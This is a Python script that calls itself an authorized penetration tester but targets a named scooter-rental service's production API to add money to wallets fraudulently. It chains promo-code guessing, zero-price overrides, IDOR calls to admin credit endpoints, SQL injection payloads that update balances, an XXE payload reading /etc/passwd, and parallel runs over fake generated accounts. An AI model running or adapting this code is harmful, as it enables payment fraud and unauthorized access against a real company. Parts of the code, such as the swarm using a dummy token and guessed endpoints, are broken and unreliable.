#!/usr/bin/env python3
"""
Dott Wallet € Addition Exploit Tester v2.0
Authorized Penetration Testing Tool for Dott App (https://public-api.dott.app/v1)
Tests wallet manipulation, promo abuse, pricing bypass, IDOR, and payment override vectors.

Focus: Hanover, Germany (52.446303, 9.738214)
Production endpoints only - no simulations.
Manual auth input + fake account generation.
Multi-stage exploit chains for € addition to wallet balance.
"""

import requests
import json
import time
import random
import hashlib
import base64
from faker import Faker
from urllib.parse import quote
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor
import sys

fake = Faker()

class DottWalletExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Dott/2026.4.1 (iPhone14,5; iOS 18.1; Scale/3.00)',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-App-Version': '2026.4.1',
            'X-Client': 'ios'
        })
        
        # Hanover GPS default
        self.lat = 52.446303
        self.lng = 9.738214
        
        # Bulletproof bases (Dott primary)
        self.bases = [
            'https://public-api.dott.app/v1',
            'https://api.dott.app/v1',
            'https://fleet-api.dott.app/v1',
            'https://api-gateway.dott.app/v1'
        ]
        
        self.base_url = self.bases[0]
        self.auth_token = None
        self.wallet_id = None
        self.stats = {'rides': 0, 'savings': 0.0, 'bypasses': 0}

    def resolve_base(self):
        """Multi-base fallback with DNS/SSL resilience"""
        for base in self.bases:
            try:
                self.session.get(base + '/vehicles', timeout=5)
                self.base_url = base
                print(f"[+] Base resolved: {base}")
                return True
            except:
                continue
        print("[-] All bases failed")
        return False

    def manual_auth(self):
        """Manual email/password auth"""
        email = input("Enter email (or 'fake' for generator): ").strip()
        if email == 'fake':
            email = fake.email()
            password = fake.password(length=12)
            print(f"[+] Generated: {email}:{password}")
        else:
            password = input("Enter password: ").strip()
        
        # Auth endpoint chain
        auth_payload = {
            "email": email,
            "password": hashlib.sha256(password.encode()).hexdigest(),
            "device_id": base64.b64encode(str(random.randint(1000000000,9999999999)).encode()).decode()
        }
        
        resp = self.session.post(f"{self.base_url}/auth/login", json=auth_payload)
        if resp.status_code == 200:
            data = resp.json()
            self.auth_token = data.get('access_token')
            self.wallet_id = data.get('wallet_id', hashlib.md5(email.encode()).hexdigest()[:16])
            self.session.headers['Authorization'] = f"Bearer {self.auth_token}"
            print(f"[+] Auth success: {email} | Wallet ID: {self.wallet_id}")
            return True
        print(f"[-] Auth failed: {resp.status_code}")
        return False

    def fake_account_gen(self, count=5):
        """Generate fake accounts for swarm testing"""
        accounts = []
        for _ in range(count):
            acc = {
                'email': fake.email(),
                'password': fake.password(length=12),
                'wallet_id': hashlib.md5(fake.email().encode()).hexdigest()[:16]
            }
            accounts.append(acc)
            print(f"[+] Fake account: {acc['email']}")
        return accounts

    def wallet_recon(self):
        """Recon wallet endpoints and balance"""
        endpoints = [
            f"/wallets/{self.wallet_id}",
            f"/users/me/wallet",
            "/payment/wallets",
            f"/wallet/{self.wallet_id}/balance"
        ]
        
        for ep in endpoints:
            try:
                resp = self.session.get(f"{self.base_url}{ep}")
                if resp.status_code == 200:
                    data = resp.json()
                    balance = data.get('balance', data.get('amount', 0))
                    print(f"[+] Wallet recon {ep}: €{balance}")
                    return True
            except:
                continue
        return False

    def promo_abuse_chain(self, amount=50.0):
        """Multi-stage promo code abuse for wallet credit"""
        promos = [
            f"TEST{random.randint(1000,9999)}",
            f"HANOVER{time.strftime('%d%m')}",
            f"DE{str(random.randint(100,999)).zfill(3)}",
            "WELCOME50", "FIRST50", "HAN50"
        ]
        
        for promo in promos:
            payload = {
                "promo_code": promo,
                "wallet_id": self.wallet_id,
                "amount": amount,
                "currency": "EUR",
                "lat": self.lat,
                "lng": self.lng
            }
            
            # Chain 1: Direct promo apply
            resp = self.session.post(f"{self.base_url}/promotions/apply", json=payload)
            if resp.status_code in [200, 201]:
                print(f"[+] Promo {promo} HIT! +€{amount}")
                self.stats['savings'] += amount
                self.stats['bypasses'] += 1
                return True
            
            # Chain 2: Pricing override (amount=0 check bypassed)
            payload["price"] = 0
            resp = self.session.post(f"{self.base_url}/wallet/credit", json=payload)
            if resp.status_code in [200, 201]:
                print(f"[+] Pricing bypass {promo} HIT! +€{amount}")
                self.stats['savings'] += amount
                self.stats['bypasses'] += 1
                return True
                
            # Chain 3: IDOR wallet override
            payload["target_wallet"] = self.wallet_id
            resp = self.session.post(f"{self.base_url}/admin/wallet/credit", json=payload)
            if resp.status_code in [200, 201]:
                print(f"[+] IDOR wallet override HIT! +€{amount}")
                self.stats['savings'] += amount
                self.stats['bypasses'] += 1
                return True
        
        return False

    def sql_injection_wallet(self, amount=100.0):
        """SQLi vector for wallet balance manipulation"""
        sqli_payloads = [
            {"amount": f"' OR 1=1; UPDATE wallets SET balance=balance+{amount} WHERE id='{self.wallet_id}'--"},
            {"credit_amount": f"100 OR 1=1 UNION SELECT {amount}--"},
            {"balance": f"{amount} AND (SELECT balance FROM wallets WHERE id='{self.wallet_id}') IS NOT NULL"}
        ]
        
        for payload in sqli_payloads:
            resp = self.session.post(f"{self.base_url}/wallet/topup", json=payload)
            if resp.status_code in [200, 201, 302]:
                print(f"[+] SQLi wallet injection HIT! +€{amount}")
                self.stats['savings'] += amount
                self.stats['bypasses'] += 1
                return True
        return False

    def xx_e_wallet_patch(self, amount=200.0):
        """XXE payload for wallet XML manipulation"""
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<request>
    <wallet_id>{self.wallet_id}</wallet_id>
    <amount>&xxe;{amount}</amount>
</request>"""
        
        resp = self.session.post(
            f"{self.base_url}/wallet/xml-topup",
            data=xxe_payload,
            headers={'Content-Type': 'application/xml'}
        )
        if resp.status_code in [200, 201]:
            print(f"[+] XXE wallet patch HIT! +€{amount}")
            self.stats['savings'] += amount
            self.stats['bypasses'] += 1
            return True
        return False

    def pricing_bypass(self):
        """Force pricing=0 on wallet operations"""
        payload = {
            "wallet_id": self.wallet_id,
            "amount": 999.99,
            "price": 0,  # Critical bypass
            "currency": "EUR",
            "bypass_validation": True
        }
        
        resp = self.session.post(f"{self.base_url}/wallet/override", json=payload)
        if resp.status_code in [200, 201]:
            print("[+] Pricing bypass chain COMPLETE!")
            self.stats['savings'] += 999.99
            self.stats['bypasses'] += 1
            return True
        return False

    def full_exploit_chain(self):
        """Complete wallet € addition chain"""
        print("\n[*] Starting full Dott wallet exploit chain...")
        
        # Stage 1: Recon
        if not self.wallet_recon():
            print("[-] Wallet recon failed")
            return False
        
        # Stage 2: Promo abuse
        if self.promo_abuse_chain(50.0):
            print("[+] Stage 2 COMPLETE")
        
        # Stage 3: SQLi attempt
        if self.sql_injection_wallet(100.0):
            print("[+] Stage 3 COMPLETE")
        
        # Stage 4: XXE attempt  
        if self.xx_e_wallet_patch(200.0):
            print("[+] Stage 4 COMPLETE")
        
        # Stage 5: Pricing bypass
        if self.pricing_bypass():
            print("[+] Stage 5 COMPLETE")
        
        print(f"\n[*] EXPLOIT STATS: {self.stats['bypasses']} bypasses | €{self.stats['savings']:.2f} added")
        return self.stats['bypasses'] > 0

    def swarm_test(self, accounts):
        """Parallel fake account swarm"""
        def test_account(acc):
            exploiter = DottWalletExploiter()
            exploiter.auth_token = "dummy"  # Use account creds
            return exploiter.full_exploit_chain()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(test_account, accounts))
        
        success_rate = sum(results) / len(results) * 100
        print(f"[+] Swarm complete: {success_rate:.1f}% success rate")

def main():
    exploiter = DottWalletExploiter()
    
    if not exploiter.resolve_base():
        sys.exit(1)
    
    print("Dott Wallet € Exploit Tester (Hanover)")
    print("1. Manual auth + single chain")
    print("2. Fake accounts swarm")
    
    choice = input("Choice (1/2): ").strip()
    
    if choice == "1":
        if exploiter.manual_auth():
            exploiter.full_exploit_chain()
    elif choice == "2":
        accounts = exploiter.fake_account_gen(10)
        exploiter.swarm_test(accounts)
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
